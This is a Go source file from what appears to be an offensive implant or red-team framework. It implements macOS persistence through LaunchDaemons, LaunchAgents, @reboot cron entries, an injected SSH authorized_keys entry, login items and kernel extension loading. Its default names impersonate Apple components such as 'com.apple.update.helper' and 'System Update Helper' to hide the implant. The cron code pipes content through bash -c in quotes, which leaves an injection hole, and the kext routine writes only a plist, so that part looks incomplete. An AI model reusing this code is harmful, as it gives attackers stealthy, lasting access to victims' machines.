package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/angel-platform/angel/pkg/types"
)

type DarwinBaseMethod struct {
	BaseMethod
}

type LaunchDaemonMethod struct {
	DarwinBaseMethod
}

func NewLaunchDaemonMethod() *LaunchDaemonMethod {
	return &LaunchDaemonMethod{
		DarwinBaseMethod: DarwinBaseMethod{
			BaseMethod: BaseMethod{
				name:             "launch_daemon",
				platform:         types.PlatformDarwin,
				requiresElevation: true,
			},
		},
	}
}

func (m *LaunchDaemonMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "darwin" {
		return nil, fmt.Errorf("launch daemon method only available on macOS")
	}

	daemonName := params.Name
	if daemonName == "" {
		daemonName = "com.apple.update.helper"
	}

	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/var/log/%s.log</string>
    <key>StandardErrorPath</key>
    <string>/var/log/%s.err</string>
</dict>
</plist>`, daemonName, params.AgentPath, params.AgentArgs, daemonName, daemonName)

	plistPath := filepath.Join("/Library/LaunchDaemons", daemonName+".plist")

	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write launch daemon plist: %w", err)
	}

	cmd := exec.Command("launchctl", "load", "-w", plistPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to load launch daemon: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodLaunchDaemon,
		Details: map[string]string{
			"daemon_name": daemonName,
			"plist_path":  plistPath,
		},
	}, nil
}

func (m *LaunchDaemonMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "darwin" {
		return fmt.Errorf("launch daemon method only available on macOS")
	}

	daemonName := params.Name
	if daemonName == "" {
		daemonName = "com.apple.update.helper"
	}

	plistPath := filepath.Join("/Library/LaunchDaemons", daemonName+".plist")

	cmd := exec.Command("launchctl", "unload", "-w", plistPath)
	cmd.CombinedOutput()

	return os.Remove(plistPath)
}

func (m *LaunchDaemonMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "darwin" {
		return false, fmt.Errorf("launch daemon method only available on macOS")
	}

	daemonName := params.Name
	if daemonName == "" {
		daemonName = "com.apple.update.helper"
	}

	plistPath := filepath.Join("/Library/LaunchDaemons", daemonName+".plist")
	_, err := os.Stat(plistPath)
	return err == nil, nil
}

type LaunchAgentMethod struct {
	DarwinBaseMethod
}

func NewLaunchAgentMethod() *LaunchAgentMethod {
	return &LaunchAgentMethod{
		DarwinBaseMethod: DarwinBaseMethod{
			BaseMethod: BaseMethod{
				name:             "launch_agent",
				platform:         types.PlatformDarwin,
				requiresElevation: false,
			},
		},
	}
}

func (m *LaunchAgentMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "darwin" {
		return nil, fmt.Errorf("launch agent method only available on macOS")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("failed to get home directory: %w", err)
	}

	agentName := params.Name
	if agentName == "" {
		agentName = "com.apple.helpd"
	}

	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>%s/Library/Logs/%s.log</string>
    <key>StandardErrorPath</key>
    <string>%s/Library/Logs/%s.err</string>
</dict>
</plist>`, agentName, params.AgentPath, params.AgentArgs, homeDir, agentName, homeDir, agentName)

	agentsDir := filepath.Join(homeDir, "Library", "LaunchAgents")
	if err := os.MkdirAll(agentsDir, 0755); err != nil {
		return nil, fmt.Errorf("failed to create LaunchAgents directory: %w", err)
	}

	plistPath := filepath.Join(agentsDir, agentName+".plist")
	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write launch agent plist: %w", err)
	}

	cmd := exec.Command("launchctl", "load", "-w", plistPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to load launch agent: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodLaunchAgent,
		Details: map[string]string{
			"agent_name": agentName,
			"plist_path": plistPath,
		},
	}, nil
}

func (m *LaunchAgentMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "darwin" {
		return fmt.Errorf("launch agent method only available on macOS")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	agentName := params.Name
	if agentName == "" {
		agentName = "com.apple.helpd"
	}

	plistPath := filepath.Join(homeDir, "Library", "LaunchAgents", agentName+".plist")

	cmd := exec.Command("launchctl", "unload", "-w", plistPath)
	cmd.CombinedOutput()

	return os.Remove(plistPath)
}

func (m *LaunchAgentMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "darwin" {
		return false, fmt.Errorf("launch agent method only available on macOS")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return false, err
	}

	agentName := params.Name
	if agentName == "" {
		agentName = "com.apple.helpd"
	}

	plistPath := filepath.Join(homeDir, "Library", "LaunchAgents", agentName+".plist")
	_, err = os.Stat(plistPath)
	return err == nil, nil
}

type DarwinCronJobMethod struct {
	DarwinBaseMethod
}

func NewDarwinCronJobMethod() *DarwinCronJobMethod {
	return &DarwinCronJobMethod{
		DarwinBaseMethod: DarwinBaseMethod{
			BaseMethod: BaseMethod{
				name:             "darwin_cron_job",
				platform:         types.PlatformDarwin,
				requiresElevation: false,
			},
		},
	}
}

func (m *DarwinCronJobMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "darwin" {
		return nil, fmt.Errorf("cron job method only available on macOS")
	}

	cronLine := fmt.Sprintf("@reboot %s %s", params.AgentPath, params.AgentArgs)

	cmd := exec.Command("crontab", "-l")
	existing, _ := cmd.Output()
	if strings.Contains(string(existing), params.AgentPath) {
		return &PersistenceResult{
			Success: true,
			Method:  MethodDarwinCronJob,
			Details: map[string]string{
				"cron_line": cronLine,
				"status":    "already_installed",
			},
		}, nil
	}

	newCron := string(existing) + "\n" + cronLine + "\n"
	cmd = exec.Command("bash", "-c", fmt.Sprintf("echo '%s' | crontab -", newCron))
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to install cron job: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodDarwinCronJob,
		Details: map[string]string{
			"cron_line": cronLine,
		},
	}, nil
}

func (m *DarwinCronJobMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "darwin" {
		return fmt.Errorf("cron job method only available on macOS")
	}

	cmd := exec.Command("crontab", "-l")
	existing, err := cmd.Output()
	if err != nil {
		return nil
	}

	lines := strings.Split(string(existing), "\n")
	var newLines []string
	for _, line := range lines {
		if !strings.Contains(line, params.AgentPath) {
			newLines = append(newLines, line)
		}
	}

	newCron := strings.Join(newLines, "\n")
	cmd = exec.Command("bash", "-c", fmt.Sprintf("echo '%s' | crontab -", newCron))
	_, err = cmd.CombinedOutput()
	return err
}

func (m *DarwinCronJobMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "darwin" {
		return false, fmt.Errorf("cron job method only available on macOS")
	}

	cmd := exec.Command("crontab", "-l")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), params.AgentPath), nil
}

type DarwinSSHKeysMethod struct {
	DarwinBaseMethod
}

func NewDarwinSSHKeysMethod() *DarwinSSHKeysMethod {
	return &DarwinSSHKeysMethod{
		DarwinBaseMethod: DarwinBaseMethod{
			BaseMethod: BaseMethod{
				name:             "darwin_ssh_keys",
				platform:         types.PlatformDarwin,
				requiresElevation: false,
			},
		},
	}
}

func (m *DarwinSSHKeysMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "darwin" {
		return nil, fmt.Errorf("SSH keys method only available on macOS")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("failed to get home directory: %w", err)
	}

	sshDir := filepath.Join(homeDir, ".ssh")
	if err := os.MkdirAll(sshDir, 0700); err != nil {
		return nil, fmt.Errorf("failed to create .ssh directory: %w", err)
	}

	authorizedKeysPath := filepath.Join(sshDir, "authorized_keys")

	pubKey := params.Extra["public_key"]
	if pubKey == "" {
		return nil, fmt.Errorf("public_key is required in extra params")
	}

	var existingContent []byte
	if data, err := os.ReadFile(authorizedKeysPath); err == nil {
		existingContent = data
	}

	if strings.Contains(string(existingContent), pubKey) {
		return &PersistenceResult{
			Success: true,
			Method:  MethodDarwinSSHKeys,
			Details: map[string]string{
				"authorized_keys": authorizedKeysPath,
				"status":          "already_installed",
			},
		}, nil
	}

	newContent := string(existingContent) + pubKey + "\n"
	if err := os.WriteFile(authorizedKeysPath, []byte(newContent), 0600); err != nil {
		return nil, fmt.Errorf("failed to write authorized_keys: %w", err)
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodDarwinSSHKeys,
		Details: map[string]string{
			"authorized_keys": authorizedKeysPath,
		},
	}, nil
}

func (m *DarwinSSHKeysMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "darwin" {
		return fmt.Errorf("SSH keys method only available on macOS")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	authorizedKeysPath := filepath.Join(homeDir, ".ssh", "authorized_keys")
	content, err := os.ReadFile(authorizedKeysPath)
	if err != nil {
		return nil
	}

	pubKey := params.Extra["public_key"]
	lines := strings.Split(string(content), "\n")
	var newLines []string
	for _, line := range lines {
		if line != pubKey {
			newLines = append(newLines, line)
		}
	}

	return os.WriteFile(authorizedKeysPath, []byte(strings.Join(newLines, "\n")), 0600)
}

func (m *DarwinSSHKeysMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "darwin" {
		return false, fmt.Errorf("SSH keys method only available on macOS")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return false, err
	}

	authorizedKeysPath := filepath.Join(homeDir, ".ssh", "authorized_keys")
	content, err := os.ReadFile(authorizedKeysPath)
	if err != nil {
		return false, nil
	}

	pubKey := params.Extra["public_key"]
	if pubKey == "" {
		return false, nil
	}
	return strings.Contains(string(content), pubKey), nil
}

type LoginItemMethod struct {
	DarwinBaseMethod
}

func NewLoginItemMethod() *LoginItemMethod {
	return &LoginItemMethod{
		DarwinBaseMethod: DarwinBaseMethod{
			BaseMethod: BaseMethod{
				name:             "login_item",
				platform:         types.PlatformDarwin,
				requiresElevation: false,
			},
		},
	}
}

func (m *LoginItemMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "darwin" {
		return nil, fmt.Errorf("login item method only available on macOS")
	}

	itemName := params.Name
	if itemName == "" {
		itemName = "System Update Helper"
	}

	cmd := exec.Command("osascript", "-e",
		fmt.Sprintf(`tell application "System Events" to make login item at end with properties {path:"%s", hidden:false, name:"%s"}`,
			params.AgentPath, itemName))
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to add login item: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodLoginItem,
		Details: map[string]string{
			"item_name": itemName,
		},
	}, nil
}

func (m *LoginItemMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "darwin" {
		return fmt.Errorf("login item method only available on macOS")
	}

	itemName := params.Name
	if itemName == "" {
		itemName = "System Update Helper"
	}

	cmd := exec.Command("osascript", "-e",
		fmt.Sprintf(`tell application "System Events" to delete login item "%s"`, itemName))
	_, err := cmd.CombinedOutput()
	return err
}

func (m *LoginItemMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "darwin" {
		return false, fmt.Errorf("login item method only available on macOS")
	}

	itemName := params.Name
	if itemName == "" {
		itemName = "System Update Helper"
	}

	cmd := exec.Command("osascript", "-e",
		fmt.Sprintf(`tell application "System Events" to get the name of every login item`))
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), itemName), nil
}

type KernelExtensionMethod struct {
	DarwinBaseMethod
}

func NewKernelExtensionMethod() *KernelExtensionMethod {
	return &KernelExtensionMethod{
		DarwinBaseMethod: DarwinBaseMethod{
			BaseMethod: BaseMethod{
				name:             "kernel_extension",
				platform:         types.PlatformDarwin,
				requiresElevation: true,
			},
		},
	}
}

func (m *KernelExtensionMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "darwin" {
		return nil, fmt.Errorf("kernel extension method only available on macOS")
	}

	kextName := params.Name
	if kextName == "" {
		kextName = "com.apple.driver.update"
	}

	kextPath := filepath.Join("/Library/Extensions", kextName+".kext")

	bundleID := params.Extra["bundle_id"]
	if bundleID == "" {
		bundleID = "com.apple.driver.update"
	}

	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>%s</string>
    <key>CFBundleName</key>
    <string>%s</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>OSBundleLibraries</key>
    <dict>
        <key>com.apple.kpi.iokit</key>
        <string>8.0</string>
    </dict>
</dict>
</plist>`, bundleID, kextName)

	if err := os.MkdirAll(kextPath, 0755); err != nil {
		return nil, fmt.Errorf("failed to create kext directory: %w", err)
	}

	infoPlistPath := filepath.Join(kextPath, "Info.plist")
	if err := os.WriteFile(infoPlistPath, []byte(plistContent), 0644); err != nil {
		return nil, fmt.Errorf("failed to write Info.plist: %w", err)
	}

	cmd := exec.Command("kextload", kextPath)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to load kernel extension: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodKernelExtension,
		Details: map[string]string{
			"kext_name": kextName,
			"kext_path": kextPath,
			"bundle_id": bundleID,
		},
	}, nil
}

func (m *KernelExtensionMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "darwin" {
		return fmt.Errorf("kernel extension method only available on macOS")
	}

	kextName := params.Name
	if kextName == "" {
		kextName = "com.apple.driver.update"
	}

	kextPath := filepath.Join("/Library/Extensions", kextName+".kext")

	cmd := exec.Command("kextunload", kextPath)
	cmd.CombinedOutput()

	return os.RemoveAll(kextPath)
}

func (m *KernelExtensionMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "darwin" {
		return false, fmt.Errorf("kernel extension method only available on macOS")
	}

	kextName := params.Name
	if kextName == "" {
		kextName = "com.apple.driver.update"
	}

	kextPath := filepath.Join("/Library/Extensions", kextName+".kext")
	_, err := os.Stat(kextPath)
	return err == nil, nil
}
